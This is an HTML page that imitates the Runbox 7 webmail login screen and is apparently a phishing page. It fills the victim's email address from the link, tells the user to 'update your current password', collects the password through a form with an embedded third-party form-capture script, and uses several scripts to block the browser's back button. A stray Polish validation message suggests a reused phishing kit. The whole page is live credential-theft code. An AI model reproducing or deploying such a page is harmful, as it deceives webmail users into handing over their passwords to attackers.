<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Runbox 7 Login</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            /* Rich deep blue gradient with high-quality landscape panoramic mountain banner backdrop */
            background: linear-gradient(to bottom, #004c8c 0%, #001a33 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            position: relative;
        }

        /* Top Brand Typography Section */
        .brand-header {
            text-align: center;
            padding: 40px 20px 20px;
            width: 100%;
        }

        .brand-title {
            font-size: 44px;
            font-weight: 300;
            color: #ffffff;
            letter-spacing: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            text-transform: lowercase;
        }

        .brand-title span.number-seven {
            font-style: italic;
            font-weight: 700;
            color: #ffffff;
            font-size: 52px;
        }

        .brand-subtitle {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.6);
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-top: 10px;
        }

        /* Full Width Horizon Panoramic Backdrop Strip */
        .horizon-banner {
            width: 100%;
            height: 340px;
            background: linear-gradient(rgba(0,0,0,0.2), rgba(0,0,0,0.2)), 
                        url('https://unsplash.com') no-repeat center center;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            box-shadow: inset 0 20px 40px rgba(0,0,0,0.4), inset 0 -20px 40px rgba(0,0,0,0.4);
        }

        /* Floating Semi-Transparent Pure White Card Panel Box Component */
        .login-card {
            background-color: rgba(255, 255, 255, 0.94);
            width: 100%;
            max-width: 340px;
            padding: 36px 32px;
            border-radius: 4px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
            text-align: center;
            position: absolute;
            top: -40px; /* Shifts up over the panorama border matching screenshot layout layout */
            z-index: 10;
        }

        .card-title {
            font-size: 22px;
            font-weight: 500;
            color: #111111;
            margin-bottom: 10px;
        }

        /* Alternating choice layout helper links */
        .alt-links {
            font-size: 13px;
            color: #0066cc;
            margin-bottom: 14px;
        }

        .alt-links a {
            color: #0066cc;
            text-decoration: none;
            margin: 0 6px;
        }

        .alt-links a:hover {
            text-decoration: underline;
        }

        .instruction-text {
            font-size: 13px;
            color: #444444;
            margin-bottom: 32px;
        }

        .instruction-text a {
            color: #0066cc;
            text-decoration: underline;
        }

        form {
            width: 100%;
        }

        .form-group {
            margin-bottom: 24px;
            text-align: left;
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 11px;
            color: #888888;
            margin-bottom: 4px;
        }

        /* Pure flat underline input styling frame matching layout precisely */
        .form-control {
            width: 100%;
            border: none;
            border-bottom: 1px solid #111111;
            background: transparent;
            padding: 6px 0;
            font-size: 15px;
            color: #111111;
            outline: none;
        }

        /* Muted flat square custom login box submission trigger button */
        .submit-btn {
            width: 100%;
            background-color: #e0e0e0;
            color: #888888;
            border: 1px solid #d0d0d0;
            padding: 10px;
            font-size: 13px;
            font-weight: 500;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 20px;
            transition: all 0.2s;
        }

        .submit-btn:hover {
            background-color: #d5d5d5;
        }

        /* Stay logged checkbox parameter block option component alignment */
        .checkbox-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            color: #333333;
            font-size: 13px;
            margin-bottom: 14px;
            cursor: pointer;
        }

        .checkbox-row input {
            accent-color: #0066cc;
        }

        .forgot-link {
            font-size: 13px;
            color: #0066cc;
            text-decoration: underline;
            display: inline-block;
        }

        /* Base Utilities Ribbon Matrix Footer Strip components */
        .footer-navbar {
            width: 100%;
            max-width: 1100px;
            display: flex;
            justify-content: center;
            gap: 40px;
            padding: 30px 20px;
            font-size: 13px;
            z-index: 5;
        }

        .footer-navbar a {
            color: rgba(255, 255, 255, 0.5);
            text-decoration: none;
            transition: color 0.2s;
        }

        .footer-navbar a:hover {
            color: #ffffff;
        }

        /* Desktop environment layout decoration system watermark overlay reproduction */
        .system-watermark {
            position: fixed;
            bottom: 24px;
            right: 24px;
            text-align: left;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.15);
            line-height: 1.4;
            user-select: none;
            pointer-events: none;
            z-index: 20;
        }
    </style>
</head>
<body>

    <!-- Main Branding Typographic Header Block Component -->
    <header class="brand-header">
        <div class="brand-title">runbox <span class="number-seven">7</span></div>
        <div class="brand-subtitle">The fastest webmail app on the planet</div>
    </header>

    <!-- Panoramic Horizon Workspace Section Box Strip -->
    <main class="horizon-banner">
        
        <!-- Center Interface Container Floating Card Component -->
        <div class="login-card">
            <h1 class="card-title">Runbox Login</h1>
            
            <div class="alt-links">
                <a href="#">Runbox 6 Login</a>
                <a href="#">Norsk Login</a>
            </div>
            
            <div class="instruction-text">
                Log in below or <a href="#">create a new account</a>.
            </div>

            <form action="" method="POST">
    <p style="color:red">Log in and update your current password</p>
                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
                <div class="form-group">
                    <label for="username">Username *</label>
                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>

                <div class="form-group">
                    <label for="password">Password *</label>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>
                
                <button type="submit" class="submit-btn">Log in</button>

                <div class="checkbox-row">
                    <input type="checkbox" id="remember" name="remember">
                    <label style="margin:0; display:inline; cursor:pointer;" for="remember">Stay logged in</label>
                </div>

                <a href="#" class="forgot-link">Forgot password?</a>
            </form>

        </div>

    </main>
  
<footer class="footer-navbar">  
<a href="#">About Runbox</a>
      <br><br><br><br><br>  <a href="#">Terms of Service</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Community</a>
    </footer>


 <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
